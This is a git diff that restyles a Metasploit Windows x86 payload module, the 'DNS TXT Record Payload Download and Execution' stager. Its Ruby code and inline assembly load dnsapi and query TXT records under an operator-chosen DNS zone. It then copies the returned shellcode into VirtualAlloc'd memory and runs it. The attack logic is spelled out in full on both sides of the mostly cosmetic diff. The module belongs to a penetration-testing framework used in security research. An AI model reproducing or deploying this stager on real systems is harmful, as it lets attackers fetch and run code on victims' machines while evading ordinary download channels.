@@ -4,7 +4,6 @@
 ##
 
 module MetasploitModule
-
   CachedSize = 291
 
   include Msf::Payload::Windows
@@ -12,23 +11,25 @@ module MetasploitModule
   include Msf::Payload::Windows::BlockApi
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'DNS TXT Record Payload Download and Execution',
-      'Description'   => %q{
-        Performs a TXT query against a series of DNS record(s) and executes the returned x86 shellcode. The DNSZONE
-        option is used as the base name to iterate over. The payload will first request the TXT contents of the a
-        hostname, followed by b, then c, etc. until there are no more records. For each record that is returned, exactly
-        255 bytes from it are copied into a buffer that is eventually executed. This buffer should be encoded using
-        x86/alpha_mixed with the BufferRegister option set to EDI.
-      },
-      'Author'        =>
-        [
+    super(
+      merge_info(
+        info,
+        'Name' => 'DNS TXT Record Payload Download and Execution',
+        'Description' => %q{
+          Performs a TXT query against a series of DNS record(s) and executes the returned x86 shellcode. The DNSZONE
+          option is used as the base name to iterate over. The payload will first request the TXT contents of the a
+          hostname, followed by b, then c, etc. until there are no more records. For each record that is returned, exactly
+          255 bytes from it are copied into a buffer that is eventually executed. This buffer should be encoded using
+          x86/alpha_mixed with the BufferRegister option set to EDI.
+        },
+        'Author' => [
           'corelanc0d3r <peter.ve[at]corelan.be>'
         ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'win',
-      'Arch'          => ARCH_X86
-    ))
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => ARCH_X86
+      )
+    )
 
     # EXITFUNC is not supported
     deregister_options('EXITFUNC')
@@ -36,8 +37,9 @@ module MetasploitModule
     # Register command execution options
     register_options(
       [
-        OptString.new('DNSZONE', [ true, "The DNS zone to query" ]),
-      ])
+        OptString.new('DNSZONE', [ true, 'The DNS zone to query' ]),
+      ]
+    )
   end
 
   #
@@ -65,21 +67,20 @@ module MetasploitModule
   # c.corelan.eu  : contains the last 144 bytes of the alpha shellcode
 
   def generate(_opts = {})
+    dnsname = datastore['DNSZONE']
+    w_type = 0x0010 # DNS_TYPE_TEXT (TEXT)
+    w_type_offset = 0x1c
 
-    dnsname   = datastore['DNSZONE']
-    wType   = 0x0010  #DNS_TYPE_TEXT (TEXT)
-    wTypeOffset = 0x1c
+    queryoptions = 0x248
+    # DNS_QUERY_RETURN_MESSAGE (0x200)
+    # DNS_QUERY_BYPASS_CACHE (0x08)
+    # DNS_QUERY_NO_HOSTS_FILE (0x40)
+    # DNS_QUERY_ONLY_TCP (0x02) <- not used atm
 
-    queryoptions  = 0x248
-      # DNS_QUERY_RETURN_MESSAGE (0x200)
-      # DNS_QUERY_BYPASS_CACHE (0x08)
-      # DNS_QUERY_NO_HOSTS_FILE (0x40)
-      # DNS_QUERY_ONLY_TCP (0x02) <- not used atm
+    bufferreg = 'edi'
 
-    bufferreg   = "edi"
-
-    #create actual payload
-    payload_data = %Q^
+    # create actual payload
+    payload_data = %^
       cld                     ; clear direction flag
       call start              ; start main routine
       #{asm_block_api}
@@ -95,7 +96,7 @@ module MetasploitModule
       push eax                ; flAllocationType MEM_COMMIT (0x1000)
       push eax                ; dwSize (0x1000)
       push 0x0                ; lpAddress
-      push #{Rex::Text.block_api_hash("kernel32.dll", "VirtualAlloc")}
+      push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
       call ebp
       push eax                ; save pointer on stack, will be used in memcpy
       mov #{bufferreg}, eax   ; save pointer, to jump to at the end
@@ -109,7 +110,7 @@ module MetasploitModule
       push eax                ; push 'dnsapi' to the stack
       push 0x61736e64         ; ...
       push esp                ; Push a pointer to the 'dnsapi' string on the stack.
-      push #{Rex::Text.block_api_hash("kernel32.dll", "LoadLibraryA")}
+      push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
       call ebp                ; LoadLibraryA( "dnsapi" )
 
     ;prepare for loop of queries
@@ -130,9 +131,9 @@ module MetasploitModule
       push ebx                ; ppQueryResultsSet
       push 0x0                ; pExtra
       push #{queryoptions}    ; Options
-      push #{wType}           ; wType
+      push #{w_type}          ; wType
       push eax                ; lpstrName
-      push #{Rex::Text.block_api_hash("dnsapi.dll", "DnsQuery_A")}
+      push #{Rex::Text.block_api_hash('dnsapi.dll', 'DnsQuery_A')}
       call ebp                ;
       test eax, eax           ; query ok?
       jnz jump_to_payload     ; no, jump to payload
@@ -143,13 +144,13 @@ module MetasploitModule
       db "a.#{dnsname}", 0x00
 
     get_query_result:
-      xchg #{bufferreg},edx           ; save start of heap
-      pop #{bufferreg}                ; heap structure containing DNS results (DNS_TXT_DATAA)
-      mov eax,[#{bufferreg}+0x18]     ; check the number of strings in the response
-      cmp eax,1                       ; skip if there's not exactly 1 string in the response
-      jne prepare_payload             ; jmp to payload
-      add #{bufferreg},#{wTypeOffset} ; get ptr to ptr to DNS reply
-      mov #{bufferreg},[#{bufferreg}] ; get ptr to DNS reply
+      xchg #{bufferreg},edx             ; save start of heap
+      pop #{bufferreg}                  ; heap structure containing DNS results (DNS_TXT_DATAA)
+      mov eax,[#{bufferreg}+0x18]       ; check the number of strings in the response
+      cmp eax,1                         ; skip if there's not exactly 1 string in the response
+      jne prepare_payload               ; jmp to payload
+      add #{bufferreg},#{w_type_offset} ; get ptr to ptr to DNS reply
+      mov #{bufferreg},[#{bufferreg}]   ; get ptr to DNS reply
 
     copy_piece_to_heap:
       xchg ebx,esi                    ; save counter
